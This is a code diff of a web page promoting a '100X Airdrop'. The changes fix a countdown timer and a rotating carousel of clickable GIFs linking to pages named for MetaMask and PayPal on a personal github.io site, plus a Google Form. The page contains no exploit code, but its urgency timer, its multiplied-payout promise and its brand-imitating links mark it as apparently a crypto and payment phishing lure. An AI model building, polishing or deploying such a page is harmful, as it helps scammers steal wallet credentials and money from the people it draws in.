@@ -1,3 +1,6 @@
+
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -8,7 +11,7 @@
         /* Full Page Styling */
         body {
             margin: 0;
-            overflow: invisible;
+            overflow: hidden;
             background-color: black;
             position: relative;
             display: flex;
@@ -31,7 +34,7 @@
             pointer-events: none;
         }
 
-        /* Countdown Timer (Smaller Size) */
+        /* Countdown Timer */
         .countdown-container {
             margin-top: 10px;
             color: darkblue;
@@ -54,12 +57,12 @@
             z-index: 2;
         }
 
-        /* Scrolling GIFs Container (Centered & Adjustable) */
+        /* Scrolling GIFs Container */
         .gif-container {
             position: absolute;
-            top: 50%;          /* Center vertically */
-            left: 50%;         /* Center horizontally */
-            transform: translate(-80%, -45%);  /* Adjust -50% to fine-tune horizontal positioning */
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
             width: 90%;
             height: 200px;
             display: flex;
@@ -70,37 +73,18 @@
         }
 
         /* Individual GIFs */
+        .gif-container a {
+            display: none; /* Hide all links initially */
+            position: absolute;
+        }
+
+        .gif-container a.active {
+            display: block; /* Show only the active link */
+        }
+
         .gif-container img {
             max-width: 350px;
-            position: absolute;
-            opacity: 0;
             transition: opacity 1s ease-in-out;
-        }
-
-        .gif-container img:first-child {
-            opacity: 1;
-        }
-
-        /* Floating Emojis & Images */
-        .floating {
-            position: absolute;
-            font-size: 2rem;
-            user-select: none;
-            pointer-events: none;
-            animation: fall linear infinite;
-        }
-
-        .floating-img {
-            position: absolute;
-            max-width: 80px;
-            user-select: none;
-            pointer-events: none;
-            animation: fall linear infinite;
-        }
-
-        @keyframes fall {
-            from { transform: translateY(-100%); opacity: 1; }
-            to { transform: translateY(100vh); opacity: 0; }
         }
     </style>
 </head>
@@ -118,13 +102,11 @@
     <!-- Title GIF -->
     <img src="xx.gif" alt="100X Airdrop" class="title-gif">
 
-    <!-- Scrolling GIFs (Centered) -->
+    <!-- Scrolling GIFs (Fixed Clickable Links) -->
     <div class="gif-container">
-        <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="metamask.gif" alt="MetaMask"></a>
+        <a href="https://fclmail.github.io/100xmetamaskpay/" class="active"><img src="metamask.gif" alt="MetaMask"></a>
         <a href="https://fclmail.github.io/PAYPAL/"><img src="paypal.gif" alt="PayPal"></a>
         <a href="https://docs.google.com/forms/d/e/1FAIpQLSdV5AnOMcjMyaoaHnTmeMJgKONrU6rHXs_zyf6cOyFrzpThDg/viewform"><img src="airdrop.gif" alt="Airdrop"></a>
-        <a href="https://google.ca"><img src="multiply.gif" alt="Multiply"></a>
-        <a href="https://google.ca"><img src="limitedtimeoffer.gif" alt="Limited Time Offer"></a>
     </div>
 
     <script>
@@ -148,43 +130,21 @@
         }
         updateTimer();
 
-        // Scrolling GIFs Logic
+        // Scrolling GIFs Logic - Only One Active Link at a Time
         let currentGif = 0;
-        const gifs = document.querySelectorAll(".gif-container img");
-        function showNextGif() {
-            gifs.forEach((gif, index) => {
-                gif.style.opacity = index === currentGif ? "1" : "0";
-            });
-            currentGif = (currentGif + 1) % gifs.length;
-        }
-        setInterval(showNextGif, 4000);
+        const gifLinks = document.querySelectorAll(".gif-container a");
 
-        // Floating Emojis & Images
-        const emojis = ["😃", "😀", "😄", "💵", "💰", "🎁", "🪂", "⛽"];
-        const images = ["yy.gif", "zz.png", "aa.png"];
-        function createFloatingElement(type) {
-            const element = document.createElement("div");
-            element.classList.add("floating");
-            if (type === "emoji") {
-                element.textContent = emojis[Math.floor(Math.random() * emojis.length)];
-                element.style.fontSize = Math.random() * 1.5 + 1.5 + "rem";
-            } else {
-                element.classList.add("floating-img");
-                const img = document.createElement("img");
-                img.src = images[Math.floor(Math.random() * images.length)];
-                img.style.width = Math.random() * 50 + 50 + "px";
-                element.appendChild(img);
-            }
-            element.style.left = Math.random() * 100 + "vw";
-            element.style.animationDuration = (Math.random() * 3 + 2) + "s";
-            document.body.appendChild(element);
-            setTimeout(() => element.remove(), 4000);
+        function showNextGif() {
+            gifLinks.forEach((link, index) => {
+                link.classList.remove("active");
+            });
+            gifLinks[currentGif].classList.add("active");
+
+            currentGif = (currentGif + 1) % gifLinks.length;
         }
-        setInterval(() => createFloatingElement("emoji"), 500);
-        setInterval(() => createFloatingElement("image"), 2000);
+
+        setInterval(showNextGif, 4000);
     </script>
 
 </body>
 </html>
-
-
